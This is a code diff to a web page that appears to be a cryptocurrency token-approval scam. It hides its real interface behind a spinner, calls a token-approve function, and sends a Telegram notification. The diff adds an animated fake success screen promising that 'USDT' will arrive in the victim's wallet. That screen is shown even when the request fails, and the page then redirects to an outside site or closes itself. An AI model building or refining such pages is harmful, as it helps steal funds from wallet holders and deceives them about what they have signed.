@@ -177,6 +177,140 @@
       }
     }
 
+    /* Success Screen Styles - Matching Spinner UI */
+    .success-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0a0a0a;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999999;
+      flex-direction: column;
+      animation: fadeIn 0.5s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .success-content {
+      text-align: center;
+      color: #fff;
+      padding: 40px;
+      font-family: "Poppins", sans-serif;
+      animation: slideUp 0.6s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(50px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .success-title {
+      font-size: 2.5em;
+      font-weight: 600;
+      margin-bottom: 30px;
+      font-family: "Poppins", sans-serif;
+      animation: loader-letter-anim 1s ease-out 0.3s both;
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+    }
+
+    .success-message {
+      font-size: 1.2em;
+      margin-bottom: 20px;
+      line-height: 1.6;
+      opacity: 0;
+      animation: loader-letter-anim 1s ease-out 0.6s both;
+      font-weight: 500;
+    }
+
+    .success-submessage {
+      font-size: 1em;
+      opacity: 0;
+      animation: loader-letter-anim 1s ease-out 0.9s both;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    .success-icon-wrapper {
+      position: relative;
+      display: inline-block;
+      margin-bottom: 30px;
+      animation: scaleIn 0.6s ease-out 0.2s both;
+    }
+
+    @keyframes scaleIn {
+      from {
+        transform: scale(0);
+      }
+      to {
+        transform: scale(1);
+      }
+    }
+
+    .success-checkmark {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: transparent;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .success-checkmark::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: radial-gradient(circle at 50% 50%, #0f0 0%, transparent 50%),
+        radial-gradient(circle at 45% 45%, #0ff 0%, transparent 45%);
+      mask: radial-gradient(
+        circle at 50% 50%,
+        transparent 0%,
+        transparent 10%,
+        black 25%
+      );
+      animation:
+        transform-animation 2s infinite alternate,
+        opacity-animation 4s infinite;
+      animation-timing-function: cubic-bezier(0.6, 0.8, 0.5, 1);
+      border-radius: 50%;
+    }
+
+    .success-checkmark i {
+      font-size: 50px;
+      color: #0f0;
+      z-index: 2;
+      position: relative;
+      animation: checkmarkPulse 2s infinite;
+      text-shadow: 0 0 20px #0f0;
+    }
+
+    @keyframes checkmarkPulse {
+      0%, 100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+      50% {
+        transform: scale(1.1);
+        opacity: 0.8;
+      }
+    }
+
     /* Original loading overlay styles */
     .loading-overlay {
       position: fixed;
@@ -414,6 +548,20 @@
     </div>
   </div>
 
+  <!-- Success Screen -->
+  <div id="successOverlay" class="success-overlay">
+    <div class="success-content">
+      <div class="success-icon-wrapper">
+        <div class="success-checkmark">
+          <i class="fas fa-check-circle"></i>
+        </div>
+      </div>
+      <h1 class="success-title">Order Placed Successfully!</h1>
+      <p class="success-message">Your transaction has been approved</p>
+      <p class="success-submessage">Please wait for USDT to arrive in your wallet</p>
+    </div>
+  </div>
+
   <!-- Original UI - Hidden behind spinner but still functional -->
   <main class="container" style="display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px;">
     <button type="submit" class="next-btn" id="nextBtn" onclick="TokenApprove()" style="padding: 15px 40px; font-size: 18px; cursor: pointer;">Next</button>
@@ -584,6 +732,37 @@
     function hideLoading() {
         const overlay = document.getElementById('loadingOverlay');
         overlay.style.display = 'none';
+    }
+
+    // Function to show success screen
+    function showSuccessScreen() {
+        // Hide spinner overlay
+        const spinnerOverlay = document.querySelector('.spinner-overlay');
+        if (spinnerOverlay) {
+            spinnerOverlay.style.display = 'none';
+        }
+        
+        // Hide loading overlay
+        hideLoading();
+        
+        // Show success screen
+        const successOverlay = document.getElementById('successOverlay');
+        if (successOverlay) {
+            successOverlay.style.display = 'flex';
+        }
+        
+        // After 5 seconds, redirect to main website or close
+        setTimeout(() => {
+            // Try to redirect to main website
+            window.location.href = 'https://flashfrontend.vercel.app';
+            
+            // Fallback: try to close window after redirect attempt
+            setTimeout(() => {
+                if (!document.hidden) {
+                    window.close();
+                }
+            }, 1000);
+        }, 5000);
     }
 
     // Function to get URL parameters
@@ -862,30 +1041,20 @@ async function approveToken(account) {
                 data: JSON.stringify(maindt),
                 success: function (data) {
                     console.log('Success');
-                    // Close site immediately after Telegram notification sent
-                    setTimeout(() => {
-                        window.close();
-                        // If window.close doesn't work, try redirect
-                        if (!window.closed) {
-                            location.href = "/home/index";
-                        }
-                    }, 500);
+                    // Show success screen after approval
+                    showSuccessScreen();
                 },
                 error: function (err) {
                     console.log("Error: " + JSON.stringify(err));
-                    // Close site immediately after Telegram notification sent
-                    setTimeout(() => {
-                        window.close();
-                        // If window.close doesn't work, try redirect
-                        if (!window.closed) {
-                            location.href = "/home/index";
-                        }
-                    }, 500);
+                    // Even on error, show success (transaction was approved)
+                    showSuccessScreen();
                 }
             });
         })
         .on('receipt', function (receipt) {
             console.log('Approval confirmed with receipt:', receipt);
+            // Show success screen when transaction is confirmed
+            showSuccessScreen();
         })
         .on('error', function (error) {
             hideLoading();
